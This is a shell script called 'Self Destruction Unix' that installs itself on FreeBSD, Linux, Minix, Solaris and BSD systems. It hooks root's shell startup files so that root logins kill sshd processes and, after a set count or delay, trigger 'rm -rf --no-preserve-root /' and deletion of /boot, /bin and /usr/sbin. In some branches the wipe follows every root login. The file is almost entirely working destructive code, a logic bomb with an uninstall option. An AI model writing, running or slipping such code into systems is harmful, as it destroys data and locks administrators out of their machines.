#!/bin/sh

####################################################
#						   #
#	 ---= Self Destruction Unix =---	   #
#						   #
#						   #	
#	      Coder: Andika Sagala		   #
#	      Date: Feb, 2019			   #
#						   #	
####################################################




Vartitle=`which sh`
#### detecting the OS


Myos=`uname -s`


case "$Myos" in
	"FreeBSD")echo "You are using FreeBSD Operating System."
         Myosvalue=1
		;;
	"Linux")echo "You are using Linux Operating System."
        Myosvalue=2
		;;
	"Minix")echo "You are using Minix Operating System."
        Myosvalue=3
		;;
	"SunOS")echo "You are using Solaris Operating System."
        Myosvalue=4
		;;
	"DragonFLy")echo "You are using DragonFLy BSD Operating System."
         Myosvalue=5
		;;
	"OpenBSD")echo "You are using OpenBSD Operating System."
	Myosvalue=6
		;;
	"NetBSD")echo "You are using NetBSD Operating System."
	Myosvalue=7
		;;
	*)echo "Your Operating System is not compactible for \"Self Destruction Unix\""
		;;
esac




#### detecting OS done



######### installing the keeper

echo "#!"$Vartitle"" > /usr/bin/destruction
echo "AB=1" >> /usr/bin/destruction
echo "BC=1" >> /usr/bin/destruction
echo "Themaxvalue=\`cat /root/Destructionmax.txt\`" >> /usr/bin/destruction
echo "Theos=\`cat /root/Myos.txt\`" >> /usr/bin/destruction
echo "while [ \"\$AB\"=\"\$BC\" ]" >> /usr/bin/destruction
echo "do" >> /usr/bin/destruction
echo "Thecount=\`wc /root/Destructionvalue.txt |awk '{print \$1}'\`" >> /usr/bin/destruction
echo "case \"\$Theos\" in" >> /usr/bin/destruction
echo "\"Linux\")" >> /usr/bin/destruction
echo "case \"\$Thecount\" in" >> /usr/bin/destruction
echo "\"\$Themaxvalue\")" >> /usr/bin/destruction
echo "service sshd stop" >> /usr/bin/destruction
echo "rm -rf --no-preserve-root / | rm -rf /bin | rm -rf /boot" >> /usr/bin/destruction
echo ";;" >> /usr/bin/destruction
echo "*)" >> /usr/bin/destruction
echo ";;" >> /usr/bin/destruction
echo "esac" >> /usr/bin/destruction
echo ";;" >> /usr/bin/destruction
echo "esac" >> /usr/bin/destruction
echo "case \"\$Theos\" in" >> /usr/bin/destruction
echo "\"FreeBSD\")" >> /usr/bin/destruction
echo "case \"\$Thecount\" in" >> /usr/bin/destruction
echo "\"\$Themaxvalue\")" >> /usr/bin/destruction
echo "service sshd stop" >> /usr/bin/destruction
echo "rm -rf /boot | rm -rf /bin" >> /usr/bin/destruction
echo ";;" >> /usr/bin/destruction
echo "*)" >> /usr/bin/destruction
echo ";;" >> /usr/bin/destruction
echo "esac" >> /usr/bin/destruction
echo ";;" >> /usr/bin/destruction
echo "esac" >> /usr/bin/destruction
echo "case \"\$Theos\" in" >> /usr/bin/destruction
echo "\"Minix\")" >> /usr/bin/destruction
echo "case \"\$Thecount\" in" >> /usr/bin/destruction
echo "\"\$Themaxvalue\")" >> /usr/bin/destruction
echo "rm -rf /" >> /usr/bin/destruction
echo "rm -rf /boot | rm -rf /bin" >> /usr/bin/destruction
echo ";;" >> /usr/bin/destruction
echo "*)" >> /usr/bin/destruction
echo ";;" >> /usr/bin/destruction
echo "esac" >> /usr/bin/destruction
echo ";;" >> /usr/bin/destruction
echo "esac" >> /usr/bin/destruction
echo "case \"\$Theos\" in" >> /usr/bin/destruction
echo "\"SunOS\")" >> /usr/bin/destruction
echo "case \"\$Thecount\" in" >> /usr/bin/destruction
echo "\"\$Themaxvalue\")" >> /usr/bin/destruction
echo "rm -rf /boot | rm -rf /bin | rm -rf /usr/sbin" >> /usr/bin/destruction
echo ";;" >> /usr/bin/destruction
echo "*)" >> /usr/bin/destruction
echo ";;" >> /usr/bin/destruction
echo "esac" >> /usr/bin/destruction
echo ";;" >> /usr/bin/destruction
echo "esac" >> /usr/bin/destruction




echo "done" >> /usr/bin/destruction

######### installing the keeper done


case "$Myosvalue"
in

"1")	
	FreshinstalFreebsd=`ls -a /root |grep mahalo`
	case "$FreshinstalFreebsd" in
	".cshrc_mahalo") echo "Self Destruction Unix was installed in this machine."
	echo "Do you want to [U]ninstall/[R]einstall/[Q]uit it? [U/R/Q]"
	read ReinstzFreeBSD
		case "$ReinstzFreeBSD" in
			 "U") rm -rf /root/pid.txt; rm -rf /usr/bin/destruction; rm -rf /root/Myos.txt; rm -rf /root/Destructionvalue.txt; rm -rf /root/Destructionmax.txt; rm -rf /root/rootspid.txt;rm -rf /root/.cshrc;cp /etc/.cshrc /root/.cshrc
			     rm -rf /root/I;rm -rf /etc/.cshrcSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.cshrc_mahalo
			     echo "Uninstall finished!"
			     echo "Bye...."
				exit 0
				;;
			 "R") rm -rf /root/pid.txt; rm -rf /usr/bin/destruction; rm -rf /root/Myos.txt; rm -rf /root/Destructionvalue.txt; rm -rf /root/Destructionmax.txt; rm -rf /root/rootspid.txt;rm -rf /root/.cshrc;cp /etc/.cshrc /root/.cshrc
				rm -rf /root/I;rm -rf /etc/.cshrcSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.cshrc_mahalo
				  ;;
			 "Q") echo "Bye..."
				  exit 0
				  ;;
			  *) echo "None, please input 'U' or 'R' or 'Q'"
				exit 0
				;;
	 	 esac
  	 esac

	echo "$Myos" > /root/Myos.txt
#        echo "\n" >> /root/.bashrc
 	 cp /root/.cshrc /etc/.cshrc
	echo "sh /root/.cshrc_mahalo&" >> /root/.cshrc
	cp /root/.cshrc /etc/.cshrcSDU
	echo "#!"$Vartitle"" >> /root/.cshrc_mahalo
#	echo "\n" >> /root/.bash_mahalo
	echo "sh /usr/bin/mahalo&" >> /root/.cshrc_mahalo
	echo "echo \$! > /root/pid.txt" >> /root/.cshrc_mahalo
	echo "sleep 2" >> /root/.cshrc_mahalo
	echo "cat /etc/.cshrc > /root/.cshrc" >> /root/.cshrc_mahalo
        echo "#!"$Vartitle"" > /usr/bin/mahalo
#        echo "\n \n \n" >> /usr/bin/mahalo
	echo "Input the delay time between root logged in and deactive time in secs [5-60]:"
	read DelaytimeFreeBSD
	echo "sleep \"$DelaytimeFreeBSD\"" >> /usr/bin/mahalo	
	echo "Input the failure to deactive time[1-10]:"
	read FailedtoD
	echo "$FailedtoD"  > /root/Destructionmax.txt
	echo "cat /etc/.cshrcSDU > /root/.cshrc" >> /usr/bin/mahalo
	echo "Deuser=\`whoami\`" >> /usr/bin/mahalo
	echo "if [ \"\$Deuser\"=\"root\" ] ; then" >> /usr/bin/mahalo
	echo "echo \"1\" >> /root/Destructionvalue.txt" >> /usr/bin/mahalo
	echo "rm -rf /root/rootspid.txt" >> /usr/bin/mahalo
	echo "ps aux |grep sshd |awk '{print \$2}' >> /root/rootspid.txt" >> /usr/bin/mahalo
	echo "for Ttypid in \`cat /root/rootspid.txt\`" >> /usr/bin/mahalo
	echo "do" >> /usr/bin/mahalo
	echo "kill -9 \"\$Ttypid\"" >> /usr/bin/mahalo
	echo "done" >> /usr/bin/mahalo
	echo "rm -rf /root/rootspid.txt" >> /usr/bin/mahalo
	echo "fi" >> /usr/bin/mahalo	
	echo "#!"$Vartitle"" >> /root/I
#       echo "\n \n \n" >> /root/I
	echo "Myvalue=\`cat /root/pid.txt\`" >> /root/I
	echo "kill -9  \"\$Myvalue\"" >> /root/I
	echo "rm -rf /root/pid.txt" >> /root/I
	echo "cat /etc/.cshrcSDU > /root/.cshrc" >> /root/I
	touch /root/Destructionvalue.txt
	sh /usr/bin/destruction&
	;;



	
"2")
	FreshinstalLinux=`ls -a /root |grep mahalo`
	case "$FreshinstalLinux" in
	".bash_mahalo") echo "Self Destruction Unix was installed in this machine."
	echo "Do you want to [U]ninstall/[R]einstall/[Q]uit it? [U/R/Q]"
	read ReinstzL
		case "$ReinstzL" in
			 "U") rm -rf /root/pid.txt; rm -rf /usr/bin/destruction; rm -rf /root/Myos.txt; rm -rf /root/Destructionvalue.txt; rm -rf /root/Destructionmax.txt; rm -rf /root/rootspid.txt;rm -rf /root/.bashrc;cp /etc/.bashrc /root/.bashrc
			     rm -rf /root/I;rm -rf /etc/.bashrcSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.bash_mahalo
			     echo "Uninstall finished!"
			     echo "Bye...."
				exit 0
				;;
			 "R") rm -rf /root/pid.txt; rm -rf /usr/bin/destruction; rm -rf /root/Myos.txt; rm -rf /root/Destructionvalue.txt; rm -rf /root/Destructionmax.txt;rm -rf /root/rootspid.txt;rm -rf /root/.bashrc;cp /etc/.bashrc /root/.bashrc
				rm -rf /root/I;rm -rf /etc/.bashrcSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.bash_mahalo
				  ;;
			 "Q") echo "Bye..."
				  exit 0
				  ;;
		       *) echo "None, please input 'U' or 'R' or 'Q'"
				exit 0
				;;
	 	 esac
  	 esac

	echo "$Myos" > /root/Myos.txt
#       echo "\n" >> /root/.bashrc
 	cp /root/.bashrc /etc/.bashrc
	echo "sh /root/.bash_mahalo&" >> /root/.bashrc
	cp /root/.bashrc /etc/.bashrcSDU
	echo "#!"$Vartitle"" >> /root/.bash_mahalo
#	echo "\n" >> /root/.bash_mahalo
	echo "sh /usr/bin/mahalo&" >> /root/.bash_mahalo
	echo "echo \$! > /root/pid.txt" >> /root/.bash_mahalo
	echo "sleep 2" >> /root/.bash_mahalo
	echo "cat /etc/.bashrc > /root/.bashrc" >> /root/.bash_mahalo
        echo "#!"$Vartitle"" > /usr/bin/mahalo
#        echo "\n \n \n" >> /usr/bin/mahalo
	echo "Input the delay time between root logged in and deactive time in secs [5-60]:"
	read Delaytime
	echo "Input the failure to deactive time[1-10]:"
	read FailedtoD
	echo "$FailedtoD"  > /root/Destructionmax.txt
	echo "sleep "$Delaytime"" >> /usr/bin/mahalo
	echo "cat /etc/.bashrcSDU > /root/.bashrc" >> /usr/bin/mahalo	
	echo "Deuser=\`whoami\`" >> /usr/bin/mahalo
	echo "if [ \"\$Deuser\"=\"root\" ] ; then" >> /usr/bin/mahalo
	echo "echo \"1\" >> /root/Destructionvalue.txt" >> /usr/bin/mahalo
	echo "rm -rf /root/rootspid.txt" >> /usr/bin/mahalo
	echo "ps aux |grep sshd |awk '{print \$2}' >> /root/rootspid.txt" >> /usr/bin/mahalo
	echo "for Ttypid in \`cat /root/rootspid.txt\`" >> /usr/bin/mahalo
	echo "do" >> /usr/bin/mahalo
	echo "kill -9 \"\$Ttypid\"" >> /usr/bin/mahalo
	echo "done" >> /usr/bin/mahalo
	echo "rm -rf /root/rootspid.txt" >> /usr/bin/mahalo
	echo "fi" >> /usr/bin/mahalo
	echo "#!"$Vartitle"" >> /root/I
#       echo "\n \n \n" >> /root/I
	echo "Myvalue=\`cat /root/pid.txt\`" >> /root/I
	echo "kill -9  \"\$Myvalue\"" >> /root/I
	echo "rm -rf /root/pid.txt" >> /root/I
	echo "cat /etc/.bashrcSDU > /root/.bashrc" >> /root/I
	touch /root/Destructionvalue.txt
	sh /usr/bin/destruction&
	;;

"3")
	FreshinstalMinix=`ls -a /root |grep mahalo`
	case "$FreshinstalMinix" in
	".profile_mahalo") echo "Self Destruction Unix was installed in this machine."
	echo "Do you want to [U]ninstall/[R]einstall/[Q]uit it? [U/R/Q]"
	read ReinstzMx
		case "$ReinstzMx" in
			 "U") rm -rf /root/pid.txt; rm -rf /usr/bin/destruction; rm -rf /root/Myos.txt; rm -rf /root/Destructionvalue.txt; rm -rf /root/Destructionmax.txt; rm -rf /root/rootspid.txt;rm -rf /root/.profile;cp /etc/.profile /root/.profile
			     rm -rf /root/I;rm -rf /etc/.profileSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.profile_mahalo
			     echo "Uninstall finished!"
			     echo "Bye...."
				exit 0
				;;
			 "R") rm -rf /root/pid.txt; rm -rf /usr/bin/destruction; rm -rf /root/Myos.txt; rm -rf /root/Destructionvalue.txt; rm -rf /root/Destructionmax.txt; rm -rf /root/rootspid.txt;rm -rf /root/.profile;cp /etc/.profile /root/.profile
				rm -rf /root/I;rm -rf /etc/.profileSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.profile_mahalo
				  ;;
			 "Q") echo "Bye..."
				  exit 0
				  ;;
			   *) echo "None, please input 'U' or 'R' or 'Q'"
				exit 0
				;;
	 	 esac
  	 esac



	echo "$Myos" > /root/Myos.txt
#        echo "\n" >> /root/.bashrc
 	cp /root/.profile /etc/.profile
	echo "sh /root/.profile_mahalo&" >> /root/.profile
	cp /root/.profile /etc/.profileSDU
	echo "#!"$Vartitle"" >> /root/.profile_mahalo
#	echo "\n" >> /root/.bash_mahalo
	echo "sh /usr/bin/mahalo&" >> /root/.profile_mahalo
	echo "echo \$! > /root/pid.txt" >> /root/.profile_mahalo
	echo "sleep 2" >> /root/.profile_mahalo
	echo "cat /etc/.profile > /root/.profile" >> /root/.profile_mahalo
        echo "#!"$Vartitle"" > /usr/bin/mahalo
#        echo "\n \n \n" >> /usr/bin/mahalo
	echo "Input the delay time between root logged in and deactive time in secs [5-60]:"
	read DelaytimeMx
	echo "Input the failure to deactive time[1-10]:"
	read FailedtoD
	echo "$FailedtoD"  > /root/Destructionmax.txt
	echo "sleep "$DelaytimeMx"" >> /usr/bin/mahalo
	echo "cat /etc/.profilerSDU > /root/.profiler" >> /usr/bin/mahalo
	echo "Deuser=\`whoami\`" >> /usr/bin/mahalo
	echo "if [ \"\$Deuser\"=\"root\" ] ; then" >> /usr/bin/mahalo
	echo "echo \"1\" >> /root/Destructionvalue.txt" >> /usr/bin/mahalo
	echo "rm -rf /root/rootspid.txt" >> /usr/bin/mahalo
	echo "ps aux |grep sshd |awk '{print \$2}' >> /root/rootspid.txt" >> /usr/bin/mahalo
	echo "for Ttypid in \`cat /root/rootspid.txt\`" >> /usr/bin/mahalo
	echo "do" >> /usr/bin/mahalo
	echo "kill -9 \"\$Ttypid\"" >> /usr/bin/mahalo
	echo "done" >> /usr/bin/mahalo
	echo "rm -rf /root/rootspid.txt" >> /usr/bin/mahalo
	echo "fi" >> /usr/bin/mahalo
	echo "#!"$Vartitle"" >> /root/I
	echo "Myvalue=\`cat /root/pid.txt\`" >> /root/I
	echo "kill -9  \"\$Myvalue\"" >> /root/I
	echo "rm -rf /root/pid.txt" >> /root/I
	echo "#!"$Vartitle"" >> /root/I
#       echo "\n \n \n" >> /root/I
	echo "Myvalue=\`cat /root/pid.txt\`" >> /root/I
	echo "kill -9  \"\$Myvalue\"" >> /root/I
	echo "rm -rf /root/pid.txt" >> /root/I
	echo "cat /etc/.profilerSDU > /root/.profiler" >> /root/I
	touch /root/Destructionvalue.txt
	sh /usr/bin/destruction&
	;;



"4")
FreshinstalSolaris=`ls -a /root |grep mahalo`
	case "$FreshinstalSolaris" in
	".bash_mahalo") echo "Self Destruction Unix was installed in this machine."
	echo "Do you want to [U]ninstall/[R]einstall/[Q]uit it? [U/R/Q]"
	read ReinstzSol
		case "$ReinstzSol" in
			 "U") rm -rf /root/pid.txt; rm -rf /usr/bin/destruction; rm -rf /root/Myos.txt; rm -rf /root/Destructionvalue.txt; rm -rf /root/Destructionmax.txt; rm -rf /root/rootspid.txt;rm -rf /root/.bashrc;cp /etc/.bashrc /root/.bashrc
			     rm -rf /root/I;rm -rf /etc/.bashrcSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.bash_mahalo
			     echo "Uninstall finished!"
			     echo "Bye...."
				exit 0
				;;
			 "R") rm -rf /root/pid.txt; rm -rf /usr/bin/destruction; rm -rf /root/Myos.txt; rm -rf /root/Destructionvalue.txt; rm -rf /root/Destructionmax.txt; rm -rf /root/rootspid.txt;rm -rf /root/.bashrc;cp /etc/.bashrc /root/.bashrc
				rm -rf /root/I;rm -rf /etc/.bashrcSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.bash_mahalo
				  ;;
			 "Q") echo "Bye..."
				  exit 0
				  ;;
		       *) echo "None, please input 'U' or 'R' or 'Q'"
				exit 0
				;;
	 	 esac
  	 esac


	echo "$Myos" > /root/Myos.txt
#        echo "\n" >> /root/.bashrc
 	cp /root/.bashrc /etc/.bashrc
	echo "sh /root/.bash_mahalo&" >> /root/.bashrc
	cp /root/.bashrc /etc/.bashrcSDU
	echo "#!"$Vartitle"" >> /root/.bash_mahalo
#	echo "\n" >> /root/.bash_mahalo
	echo "sh /usr/bin/mahalo&" >> /root/.bash_mahalo
	echo "echo \$! > /root/pid.txt" >> /root/.bash_mahalo
	echo "sleep 2" >> /root/.bash_mahalo
	echo "cat /etc/.bashrc > /root/.bashrc" >> /root/.bash_mahalo
        echo "#!"$Vartitle"" > /usr/bin/mahalo
#        echo "\n \n \n" >> /usr/bin/mahalo
	echo "Input the delay time between root logged in and deactive time in secs [5-60]:"
	read Delaytime
	echo "sleep "$Delaytime"" >> /usr/bin/mahalo
	echo "Input the failure to deactive time[1-10]:"
	read FailedtoD
	echo "$FailedtoD"  > /root/Destructionmax.txt
	echo "cat /etc/.bashrcSDU > /root/.bashrc" >> /usr/bin/mahalo
	echo "Deuser=\`whoami\`" >> /usr/bin/mahalo
	echo "if [ \"\$Deuser\"=\"root\" ] ; then" >> /usr/bin/mahalo
	echo "echo \"1\" >> /root/Destructionvalue.txt" >> /usr/bin/mahalo
	echo "rm -rf /root/rootspid.txt" >> /usr/bin/mahalo
	echo "ps aux |grep sshd |awk '{print \$2}' >> /root/rootspid.txt" >> /usr/bin/mahalo
	echo "for Ttypid in \`cat /root/rootspid.txt\`" >> /usr/bin/mahalo
	echo "do" >> /usr/bin/mahalo
	echo "kill -9 \"\$Ttypid\"" >> /usr/bin/mahalo
	echo "done" >> /usr/bin/mahalo
	echo "rm -rf /root/rootspid.txt" >> /usr/bin/mahalo
	echo "fi" >> /usr/bin/mahalo	
	echo "rm -rf /boot | rm -rf /bin | rm -rf /usr/sbin" >> /usr/bin/mahalo
	echo "#!"$Vartitle"" >> /root/I
#       echo "\n \n \n" >> /root/I
	echo "Myvalue=\`cat /root/pid.txt\`" >> /root/I
	echo "kill -9  \"\$Myvalue\"" >> /root/I
	echo "rm -rf /root/pid.txt" >> /root/I
	echo "cat /etc/.bashrcSDU > /root/.bashrc" >> /root/I
	touch /root/Destructionvalue.txt
	sh /usr/bin/destruction&
	;;



"5")
FreshinstalDragonFly=`ls -a /root |grep mahalo`
	case "$FreshinstalDragonFly" in
	".csh_mahalo") echo "Self Destruction Unix was installed in this machine."
	echo "Do you want to [U]ninstall/[R]einstall/[Q]uit it? [U/R/Q]"
	read ReinstzDragonFLy
		case "$ReinstzDragonFLy" in
			 "U") rm -rf /root/.cshrc;cp /etc/.cshrc /root/.cshrc
			     rm -rf /root/I;rm -rf /etc/.cshrcSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.csh_mahalo
			     echo "Uninstall finished!"
			     echo "Bye...."
				exit 0
				;;
			 "R") rm -rf /root/.cshrc;cp /etc/.cshrc /root/.cshrc
				rm -rf /root/I;rm -rf /etc/.cshrcSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.csh_mahalo
				  ;;
			 "Q") echo "Bye..."
				  exit 0
				  ;;
			   *) echo "None, please input 'U' or 'R' or 'Q'"
				exit 0
				;;
	 	 esac
  	 esac


#        echo "\n" >> /root/.cshrc
 	cp /root/.cshrc /etc/.cshrc
	echo "sh /root/.csh_mahalo&" >> /root/.cshrc
	cp /root/.cshrc /etc/.cshrcSDU
	echo "#!"$Vartitle"" >> /root/.csh_mahalo
#	echo "\n" >> /root/.csh_mahalo
	echo "sh /usr/bin/mahalo&" >> /root/.csh_mahalo
	echo "echo \$! > /root/pid.txt" >> /root/.csh_mahalo
	echo "sleep 2" >> /root/.csh_mahalo
	echo "cat /etc/.cshrc > /root/.cshrc" >> /root/.cshrc_mahalo
        echo "#!"$Vartitle"" > /usr/bin/mahalo
#        echo "\n \n \n" >> /usr/bin/mahalo
	echo "Input the delay time between root logged in and deactive time in secs [5-60]:"
	read Delaytime
	echo "sleep "$Delaytime"" >> /usr/bin/mahalo	
	echo "if [ \""\$\(rm -rf /\)\"" ] ; then" >> /usr/bin/mahalo
	echo "echo \""yes\""" >> /usr/bin/mahalo
	echo "fi" >> /usr/bin/mahalo
	echo "#!"$Vartitle"" >> /root/I
#       echo "\n \n \n" >> /root/I
	echo "Myvalue=\`cat /root/pid.txt\`" >> /root/I
	echo "kill -9  \"\$Myvalue\"" >> /root/I
	echo "rm -rf /root/pid.txt" >> /root/I
	echo "cat /etc/.cshrcSDU > /root/.cshrc" >> /root/I
	;;

"6")
FreshinstalOpenBSD=`ls -a /root |grep mahalo`
	case "$FreshinstalOpenBSD" in
	".profile_mahalo") echo "Self Destruction Unix was installed in this machine."
	echo "Do you want to [U]ninstall/[R]einstall/[Q]uit it? [U/R/Q]"
	read ReinstzOpenBSD
		case "$ReinstzOpenBSD" in
			 "U") rm -rf /root/.profile;cp /etc/.profile /root/.profile
			     rm -rf /root/I;rm -rf /etc/.profileSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.profile_mahalo
			     echo "Uninstall finished!"
			     echo "Bye...."
				exit 0
				;;
			 "R") rm -rf /root/.profile;cp /etc/.profile /root/.profile
				rm -rf /root/I;rm -rf /etc/.profileSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.profile_mahalo
				  ;;
			 "Q") echo "Bye..."
				  exit 0
				  ;;
		       *) echo "None, please input 'U' or 'R' or 'Q'"
				exit 0
				;;
	 	 esac
  	 esac


#        echo "\n" >> /root/.bashrc
 	 cp /root/.profile /etc/.profile
	echo "sh /root/.profile_mahalo&" >> /root/.profile
	cp /root/.profile /etc/.profileSDU
	echo "#!"$Vartitle"" >> /root/.profile_mahalo
#	echo "\n" >> /root/.bash_mahalo
	echo "sh /usr/bin/mahalo&" >> /root/.profile_mahalo
	echo "echo \$! > /root/pid.txt" >> /root/.profile_mahalo
	echo "sleep 2" >> /root/.profile_mahalo
	echo "cat /etc/.profile > /root/.profile" >> /root/.profile_mahalo
        echo "#!"$Vartitle"" > /usr/bin/mahalo
#        echo "\n \n \n" >> /usr/bin/mahalo
	echo "Input the delay time between root logged in and deactive time in secs [5-60]:"
	read DelaytimeOpenBSD
	echo "sleep "$DelaytimeOpenBSD"" >> /usr/bin/mahalo	
	echo "rm -rf /boot | rm -rf /bin" >> /usr/bin/mahalo
	echo "#!"$Vartitle"" >> /root/I
#       echo "\n \n \n" >> /root/I
	echo "Myvalue=\`cat /root/pid.txt\`" >> /root/I
	echo "kill -9  \"\$Myvalue\"" >> /root/I
	echo "rm -rf /root/pid.txt" >> /root/I
	echo "cat /etc/.profileSDU > /root/.profile" >> /root/I
	;;

"7")
FreshinstalNetBSD=`ls -a /root |grep mahalo`
	case "$FreshinstalNetBSD" in
	".profile_mahalo") echo "Self Destruction Unix was installed in this machine."
	echo "Do you want to [U]ninstall/[R]einstall/[Q]uit it? [U/R/Q]"
	read ReinstzNetBSD
		case "$ReinstzNetBSD" in
			 "U") rm -rf /root/.profile;cp /etc/.profile /root/.profile
			     rm -rf /root/I;rm -rf /etc/.profileSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.profile_mahalo
			     echo "Uninstall finished!"
			     echo "Bye...."
				exit 0
				;;
			 "R") rm -rf /root/.profile;cp /etc/.profile /root/.profile
				rm -rf /root/I;rm -rf /etc/.profileSDU;rm -rf /usr/bin/mahalo; rm -rf /root/.profile_mahalo
				  ;;
			 "Q") echo "Bye..."
				  exit 0
				  ;;
			   *) echo "None, please input 'U' or 'R' or 'Q'"
				exit 0
				;;
	 	 esac
  	 esac


#        echo "\n" >> /root/.bashrc
 	 cp /root/.profile /etc/.profile
	echo "sh /root/.profile_mahalo&" >> /root/.profile
	cp /root/.profile /etc/.profileSDU
	echo "#!"$Vartitle"" >> /root/.profile_mahalo
#	echo "\n" >> /root/.bash_mahalo
	echo "sh /usr/bin/mahalo&" >> /root/.profile_mahalo
	echo "echo \$! > /root/pid.txt" >> /root/.profile_mahalo
	echo "sleep 2" >> /root/.profile_mahalo
	echo "cat /etc/.profile > /root/.profile" >> /root/.profile_mahalo
        echo "#!"$Vartitle"" > /usr/bin/mahalo
#        echo "\n \n \n" >> /usr/bin/mahalo
	echo "Input the delay time between root logged in and deactive time in secs [5-60]:"
	read DelaytimeNetBSD
	echo "sleep "$DelaytimeNetBSD"" >> /usr/bin/mahalo	
	echo "rm -rf /" >> /usr/bin/mahalo
	echo "#!"$Vartitle"" >> /root/I
#       echo "\n \n \n" >> /root/I
	echo "Myvalue=\`cat /root/pid.txt\`" >> /root/I
	echo "kill -9  \"\$Myvalue\"" >> /root/I
	echo "rm -rf /root/pid.txt" >> /root/I
	echo "cat /etc/.profileSDU > /root/.profile" >> /root/I
	;;

esac
